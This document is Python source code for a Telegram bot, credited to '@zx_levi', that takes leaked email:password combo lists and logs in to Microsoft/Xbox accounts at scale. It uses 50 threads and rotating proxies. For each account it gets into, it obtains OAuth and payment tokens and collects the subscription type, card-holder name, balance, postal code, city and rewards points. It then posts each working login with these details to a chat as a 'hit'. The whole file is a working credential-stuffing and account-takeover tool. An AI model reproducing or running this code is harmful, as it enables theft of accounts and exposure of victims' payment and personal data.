# checker by @zx_levi
# @KurdishPy

import os
import sys
import re
import time
import json
import uuid
import threading
import asyncio
import concurrent.futures
import random
from datetime import datetime
from urllib.parse import quote, unquote
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
import requests

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"

# States
COMBO_FILE, PROXY_FILE, ASK_PROXY = range(3)
user_data = {}

# Global stats
class Stats:
    def __init__(self, total):
        self.total = total
        self.hits = 0
        self.free = 0
        self.bad = 0
        self.processed = 0
        self.start_time = time.time()
        self.lock = threading.Lock()
        self.stop_flag = False

    def update(self, status):
        with self.lock:
            self.processed += 1
            if status == "PREMIUM":
                self.hits += 1
            elif status == "FREE":
                self.free += 1
            else:
                self.bad += 1

    def get_status(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            cpm = int(self.processed / elapsed * 60) if elapsed > 0 else 0
            return f"💎 Hits: {self.hits} | ❌ Bad: {self.bad} | 🆓 Free: {self.free} | ⚡ CPM: {cpm} | 📊 {self.processed}/{self.total}"

class XboxChecker:
    def __init__(self, debug=False):
        self.debug = debug

    def log(self, message):
        if self.debug:
            print(f"{CYAN}[DEBUG]{RESET} {message}")

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining)
        except:
            return "0"

    def check(self, email, password, proxy=None):
        try:
            session = requests.Session()
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
            
            correlation_id = str(uuid.uuid4())

            # Step 1: IDP Check
            self.log("Step 1: IDP check...")
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            r1 = session.get(url1, headers=headers1, timeout=15)
            self.log(f"IDP Response: {r1.status_code}")

            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                self.log("IDP check failed")
                return {"status": "BAD", "data": {}}
            if "MSAccount" not in r1.text:
                self.log("MSAccount not found")
                return {"status": "BAD", "data": {}}

            self.log("IDP check success")

            # Step 2: OAuth authorize
            self.log("Step 2: OAuth authorize...")
            time.sleep(0.5)

            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"

            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }

            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                self.log("PPFT or URL not found")
                return {"status": "BAD", "data": {}}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            self.log("PPFT found: " + ppft[:30] + "...")

            # Step 3: Login POST
            self.log("Step 3: Login POST...")
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"

            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }

            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            self.log("Login Response: " + str(r3.status_code))

            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                self.log("Bad credentials")
                return {"status": "BAD", "data": {}}

            if "https://account.live.com/identity/confirm" in r3.text:
                self.log("2FA required")
                return {"status": "2FACTOR", "data": {}}

            if "https://account.live.com/Abuse" in r3.text:
                self.log("Account banned")
                return {"status": "BANNED", "data": {}}

            location = r3.headers.get("Location", "")
            if not location:
                self.log("Redirect location not found")
                return {"status": "BAD", "data": {}}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("Auth code not found")
                return {"status": "BAD", "data": {}}

            code = code_match.group(1)
            self.log("Auth code obtained: " + code[:30] + "...")

            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("CID not found")
                return {"status": "BAD", "data": {}}

            cid = mspcid.upper()
            self.log("CID: " + cid)

            # Step 4: Get access token
            self.log("Step 4: Getting token...")
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"

            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                            data=token_data,
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=15)

            if "access_token" not in r4.text:
                self.log("Access token not obtained")
                return {"status": "BAD", "data": {}}

            token_json = r4.json()
            access_token = token_json["access_token"]
            self.log("Token obtained")

            # Step 5: Get profile info
            self.log("Step 5: Getting profile info...")
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }

            country = ""
            name = ""

            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile",
                                headers=profile_headers, timeout=15)

                if r5.status_code == 200:
                    profile = r5.json()

                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")

                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]

                    self.log("Profile: Name=" + name + " | Country=" + country)
            except Exception as e:
                self.log("Profile error: " + str(e))

            # Step 6: Get Xbox payment token
            self.log("Step 6: Getting Xbox payment token...")
            time.sleep(0.5)

            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})

            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"

            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }

            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)

            payment_token = None
            search_text = r6.text + " " + r6.url

            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]

            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break

            if not payment_token:
                self.log("Payment token not obtained - FREE")
                return {"status": "FREE", "data": {"country": country, "name": name}}

            self.log("Payment token obtained")

            # Step 7: Check payment instruments
            self.log("Step 7: Checking payment instruments...")

            payment_data = {"country": country, "name": name}
            subscription_data = {}

            correlation_id2 = str(uuid.uuid4())

            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }

            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)

                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)

                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)

                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)

                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)

                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except Exception as e:
                self.log("Payment instruments error: " + str(e))

            # Step 8: Get Bing Rewards
            try:
                rewards_r = session.get("https://rewards.bing.com/", timeout=10)
                points_match = re.search(r'"availablePoints"\s*:\s*(\d+)', rewards_r.text)
                if points_match:
                    payment_data['rewards_points'] = points_match.group(1)
            except:
                pass

            # Step 9: Check subscription
            self.log("Step 9: Checking subscription...")

            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)

                if r8.status_code == 200:
                    response_text = r8.text

                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'EA Play': 'EA PLAY',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'Game Pass': 'GAME PASS'
                    }

                    has_premium = False
                    premium_type = "FREE"

                    for keyword, type_name in premium_keywords.items():
                        if keyword in response_text:
                            has_premium = True
                            premium_type = type_name
                            break

                    if has_premium:
                        title_match = re.search(r'"title"\s*:\s*"([^"]+)"', response_text)
                        if title_match:
                            subscription_data['title'] = title_match.group(1)

                        start_match = re.search(r'"startDate"\s*:\s*"([^T"]+)', response_text)
                        if start_match:
                            subscription_data['start_date'] = start_match.group(1)

                        renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^T"]+)', response_text)
                        if renewal_match:
                            renewal_date = renewal_match.group(1)
                            subscription_data['renewal_date'] = renewal_date
                            subscription_data['days_remaining'] = self.get_remaining_days(renewal_date + "T00:00:00Z")

                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"

                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)

                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)

                        if not payment_data.get('country'):
                            country_match = re.search(r'"country"\s*:\s*"([^"]+)"', response_text)
                            if country_match:
                                payment_data['country'] = country_match.group(1)

                        subscription_data['premium_type'] = premium_type
                        subscription_data['has_premium'] = True

                        days_rem = subscription_data.get('days_remaining', '0')
                        if days_rem.startswith('-'):
                            self.log("Subscription expired")
                            return {"status": "EXPIRED", "data": {**payment_data, **subscription_data}}

                        self.log("Premium found: " + premium_type)
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        self.log("No subscription - FREE")
                        return {"status": "FREE", "data": payment_data}
            except Exception as e:
                self.log("Subscription error: " + str(e))
                return {"status": "FREE", "data": payment_data}

            return {"status": "FREE", "data": payment_data}

        except requests.exceptions.Timeout:
            self.log("Timeout")
            return {"status": "TIMEOUT", "data": {}}
        except Exception as e:
            self.log("Exception: " + str(e))
            return {"status": "ERROR", "data": {}}

# Telegram Bot Functions
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎮 **Xbox Account Checker Bot**\n\n"
        "Commands:\n"
        "/check - Start checking\n"
        "/stop - Stop checking\n"
        "/status - Check progress\n\n"
        "checker by @zx_levi",
        parse_mode='Markdown'
    )

async def check_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📁 Send combo file (txt format: email:pass)")
    return COMBO_FILE

async def receive_combo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    combo_bytes = await file.download_as_bytearray()
    combo_content = combo_bytes.decode('utf-8', errors='ignore')
    
    user_id = update.effective_user.id
    user_data[user_id] = {'combo': combo_content, 'proxy': None}
    
    await update.message.reply_text("✅ Combo received!\n\nUse proxy? Reply YES or NO")
    return ASK_PROXY

async def ask_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    response = update.message.text.upper()
    
    if response == "YES":
        await update.message.reply_text("📁 Send proxy file (txt format: ip:port or ip:port:user:pass)")
        return PROXY_FILE
    else:
        await update.message.reply_text("🚀 Starting check without proxy...")
        asyncio.create_task(run_check(user_id, update.effective_chat.id, context))
        return ConversationHandler.END

async def receive_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    proxy_bytes = await file.download_as_bytearray()
    proxy_content = proxy_bytes.decode('utf-8', errors='ignore')
    
    user_id = update.effective_user.id
    user_data[user_id]['proxy'] = proxy_content
    
    await update.message.reply_text("✅ Proxy received! 🚀 Starting check...")
    asyncio.create_task(run_check(user_id, update.effective_chat.id, context))
    return ConversationHandler.END

def format_proxy(proxy_line):
    proxy_line = proxy_line.strip()
    if not proxy_line:
        return None
    
    try:
        if proxy_line.count(':') == 3:
            parts = proxy_line.split(':')
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif '@' in proxy_line:
            return f"http://{proxy_line}"
        elif proxy_line.count(':') == 1:
            return f"http://{proxy_line}"
    except:
        pass
    return None

# Message queue for thread-safe sending
message_queue = asyncio.Queue()

async def message_sender(bot, chat_id):
    """Background task to send messages from queue"""
    while True:
        try:
            msg_data = await message_queue.get()
            if msg_data is None:  # Stop signal
                break
            text, parse_mode = msg_data
            await bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            print(f"Message send error: {e}")
            await asyncio.sleep(1)

async def run_check(user_id, chat_id, context):
    global stats
    
    data = user_data.get(user_id, {})
    combo_content = data.get('combo', '')
    proxy_content = data.get('proxy')
    
    lines = [line.strip() for line in combo_content.split('\n') if line.strip() and ':' in line]
    
    proxies = []
    if proxy_content:
        for line in proxy_content.strip().split('\n'):
            p = format_proxy(line)
            if p:
                proxies.append(p)
    
    stats = Stats(len(lines))
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"🚀 Xbox Checker Started!\n📊 Total: {len(lines)} combos\n🌐 Proxies: {len(proxies)}\n\nchecker by @zx_levi"
    )
    
    checker = XboxChecker(debug=False)
    
    # Start message sender task
    sender_task = asyncio.create_task(message_sender(context.bot, chat_id))
    
    results = []
    
    def process_combo(combo):
        if stats.stop_flag:
            return
        
        try:
            email, password = combo.split(':', 1)
        except:
            stats.update("BAD")
            return
        
        proxy = None
        if proxies:
            proxy = random.choice(proxies)
        
        result = checker.check(email, password, proxy)
        status = result.get("status", "ERROR")
        data = result.get("data", {})
        
        if status == "PREMIUM":
            msg = f"""💎 **XBOX PREMIUM HIT**

📧 `{email}:{password}`
🏷️ Type: {data.get('premium_type', 'UNKNOWN')}
⏰ Days Left: {data.get('days_remaining', '?')}
🌍 Country: {data.get('country', 'N/A')}
👤 Name: {data.get('name', 'N/A')}
💳 Card: {data.get('card_holder', 'N/A')}
💰 Balance: {data.get('balance', 'N/A')}
🎁 Points: {data.get('rewards_points', 'N/A')}
🔁 Auto Renew: {data.get('auto_renew', '?')}
📅 Renewal: {data.get('renewal_date', 'N/A')}

checker by @zx_levi"""
            results.append((msg, 'Markdown'))
            
        elif status == "FREE":
            msg = f"""🆓 **XBOX FREE**

📧 `{email}:{password}`
🌍 Country: {data.get('country', 'N/A')}
👤 Name: {data.get('name', 'N/A')}
💳 Card: {data.get('card_holder', 'N/A')}
💰 Balance: {data.get('balance', 'N/A')}
🎁 Points: {data.get('rewards_points', 'N/A')}

checker by @zx_levi"""
            results.append((msg, 'Markdown'))
            
        elif status == "2FACTOR":
            msg = f"""🔐 **2FA ACCOUNT**

📧 `{email}:{password}`

checker by @zx_levi"""
            results.append((msg, 'Markdown'))
            
        elif status == "BANNED":
            msg = f"""🚫 **BANNED ACCOUNT**

📧 `{email}:{password}`

checker by @zx_levi"""
            results.append((msg, 'Markdown'))
        
        stats.update(status)
    
    # Run in thread pool
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = [loop.run_in_executor(executor, process_combo, combo) for combo in lines]
        
        for i, future in enumerate(asyncio.as_completed(futures)):
            if stats.stop_flag:
                break
            await future
            
            # Send queued messages periodically
            while results:
                try:
                    msg, parse_mode = results.pop(0)
                    await message_queue.put((msg, parse_mode))
                except:
                    break
            
            # Small delay to prevent flooding
            if i % 10 == 0:
                await asyncio.sleep(0.1)
    
    # Send remaining messages
    await asyncio.sleep(2)
    while not message_queue.empty():
        await asyncio.sleep(0.5)
    
    # Stop message sender
    await message_queue.put(None)
    try:
        await asyncio.wait_for(sender_task, timeout=5)
    except:
        pass
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"✅ **Check Complete!**\n\n💎 Premium: {stats.hits}\n🆓 Free: {stats.free}\n❌ Bad: {stats.bad}\n📊 Total: {stats.processed}\n\nchecker by @zx_levi"
    )

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats.stop_flag = True
    await update.message.reply_text("🛑 Stopping... Please wait.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"📊 **Current Status**\n\n{stats.get_status()}\n\nchecker by @zx_levi")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Cancelled")
    return ConversationHandler.END

def main():
    BOT_TOKEN = os.getenv("BOT_TOKEN")
    
    if not BOT_TOKEN:
        print("Error: BOT_TOKEN environment variable not set!")
        return
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('check', check_start)],
        states={
            COMBO_FILE: [MessageHandler(filters.Document.TEXT, receive_combo)],
            ASK_PROXY: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_proxy)],
            PROXY_FILE: [MessageHandler(filters.Document.TEXT, receive_proxy)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )
    
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('stop', stop_check))
    application.add_handler(CommandHandler('status', status))
    application.add_handler(conv_handler)
    
    print("Xbox Checker Bot is running...")
    print("checker by @zx_levi")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()